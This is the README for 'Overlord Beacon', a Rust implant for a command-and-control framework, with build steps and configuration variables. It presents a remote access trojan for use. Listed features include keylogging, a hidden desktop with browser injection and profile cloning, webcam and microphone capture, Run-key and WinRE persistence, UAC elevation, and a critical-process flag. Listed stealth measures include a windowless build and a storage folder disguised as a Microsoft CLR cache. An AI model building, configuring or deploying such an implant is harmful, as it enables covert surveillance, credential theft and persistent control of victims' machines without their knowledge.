# Overlord Beacon

Full Rust payload for the Overlord wire contract. The Go agent remains the
default provider; this crate is selected from the Build page as **Rust
Beacon** after installing `plugins/rust-beacon-builder`.

## What it implements

The client advertises every command in `protocol/wire-contract.json` and uses
the same MessagePack envelope semantics as the Go agent:

- enrollment challenge signing (Ed25519), TLS identity pinning, heartbeat
  jitter, reconnect backoff, server rotation
- console (ConPTY), files, processes, screenshot, desktop streaming and input,
  clipboard, keylogger, script/silent execution, persistence, UAC elevation,
  self-update, proxy tunnels, native plugins, WinRE persistence
- webcam capture (Media Foundation via `nokhwa`), microphone/system audio
  capture and playback (WASAPI via `cpal`), WebRTC publish and P2P signaling
  with H.264 screen video (OpenH264)
- a real hidden desktop for Backstage: `CreateDesktop` plus a worker thread
  pinned to it, processes launched with `STARTUPINFO.lpDesktop`, input posted
  to the hidden windows, and DWM thumbnail composition captured through a
  staging window (GPU compositing stays enabled)
- hidden browser with Chromium/Edge/Firefox process injection into the hidden
  desktop, optional full or lite user-data cloning, and a separate profile per
  launch so an existing interactive browser is never reused

Desktop frames use the `jpeg` wire format with a libjpeg-turbo SIMD encoder.
WebRTC sessions use H.264 directly.

Windows-only subsystems return a clear `command_result` failure on other
platforms instead of reporting success.

## Build

Rust 1.88 or newer.

```text
cd Overlord-Beacon
cargo build --release
```

The output is `target/release/overlord-beacon` (`overlord-beacon.exe` on
Windows). The release profile uses `opt-level = 3`, full LTO, one codegen
unit, symbol stripping, and `panic = "abort"`. Windows builds are GUI-subsystem
executables and call `FreeConsole` at startup.

Builder-produced binaries embed the server URL, agent token, signed build tag,
and active TLS SPKI pins. Runtime `OVERLORD_SERVER`, `OVERLORD_AGENT_TOKEN`,
`OVERLORD_BUILD_TAG`, and `OVERLORD_TLS_SPKI_PINS` override them.

## Configuration

| Variable | Default | Purpose |
| --- | --- | --- |
| `OVERLORD_SERVER` | compiled value | One server, or a comma-separated rotation list |
| `OVERLORD_AGENT_TOKEN` | compiled value | Shared server agent token |
| `OVERLORD_BUILD_TAG` | compiled value | Signed build attribution |
| `OVERLORD_TLS_SPKI_PINS` | compiled value | Comma-separated `sha256/<base64>` pins |
| `OVERLORD_TLS_INSECURE_SKIP_VERIFY` | `false` | Development-only TLS bypass (also permits `ws://`) |
| `OVERLORD_BEACON_STATE_DIR` | `%LOCALAPPDATA%\Microsoft\CLR\.cache` | Identity and log directory |
| `OVERLORD_BEACON_RECONNECT_DELAY_MS` | `5000` | Base reconnect delay (jittered) |
| `OVERLORD_BEACON_PING_INTERVAL_MS` | `30000` | Base heartbeat interval (jittered) |
| `OVERLORD_BEACON_MUTEX` | `Local\OverlordBeacon` | Duplicate-instance mutex |
| `OVERLORD_BEACON_DISABLE_MUTEX` | `false` | Skip mutex acquisition |
| `OVERLORD_BEACON_PERSISTENCE` | compiled value | Install Run-key persistence on start |
| `OVERLORD_BEACON_STARTUP_NAME` | compiled value | Persistence value/file name |
| `OVERLORD_BEACON_SLEEP_SECONDS` | compiled value | Initial sleep before connecting |
| `OVERLORD_BEACON_CRITICAL_PROCESS` | compiled value | Mark the process critical |

The identity file is a binary DPAPI-protected blob (`identity.bin`) with no
plaintext JSON field names.

## Wire notes

- Command results preserve the Go agent's presence rules (for example
  `file_list` and `process_list` do not send an extra `command_result`).
- `command_abort` cancels `file_zip`, `file_dirsize`, and `file_hash`.
- Plugin events are forwarded to the loaded DLL's `PluginOnEvent` export.
- The keylogger uses `WH_KEYBOARD_LL` instead of the Go agent's polling loop.
